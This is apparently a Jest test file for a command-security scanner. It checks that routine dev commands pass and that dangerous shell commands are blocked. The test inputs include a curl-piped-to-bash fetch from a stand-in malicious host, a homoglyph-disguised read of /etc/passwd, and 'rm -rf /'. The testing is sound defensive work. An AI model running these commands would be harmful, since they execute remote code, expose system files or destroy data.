import { CommandSecurityStaticScannerService } from '../../src/services/security/CommandSecurityStaticScannerService.js';

describe('CommandSecurityStaticScannerService', () => {
  let scanner: CommandSecurityStaticScannerService;

  beforeEach(() => {
    scanner = new CommandSecurityStaticScannerService();
  });

  it('allows safe everyday development commands', () => {
    const commands = [
      'npm test',
      'git status',
      'npx jest --verbose',
      'cargo build --release',
      'pytest tests/',
    ];

    for (const cmd of commands) {
      const result = scanner.scan(cmd);
      expect(result.safe).toBe(true);
      expect(result.blocked).toBe(false);
      expect(result.violations).toHaveLength(0);
    }
  });

  it('blocks dangerous curl/wget piped directly into bash/sh interpreters', () => {
    const dangerousCmd = 'curl -sSL https://malicious.example/install.sh | bash';
    const result = scanner.scan(dangerousCmd);

    expect(result.safe).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.violations[0].kind).toBe('pipe_to_interpreter');
  });

  it('detects and blocks homoglyph attacks in executable names', () => {
    // Cyrillic 'а' (\u0430) disguised as Latin 'a' in 'cat' -> 'с\u0430t'
    const spoofedCmd = 'c\u0430t /etc/passwd';
    const result = scanner.scan(spoofedCmd);

    expect(result.safe).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.violations[0].kind).toBe('homoglyph_spoof');
  });

  it('blocks destructive deletions targeting root or system directories', () => {
    const rootDeletion = 'rm -rf /';
    const result = scanner.scan(rootDeletion);

    expect(result.safe).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.violations[0].kind).toBe('destructive_root_target');
  });
});
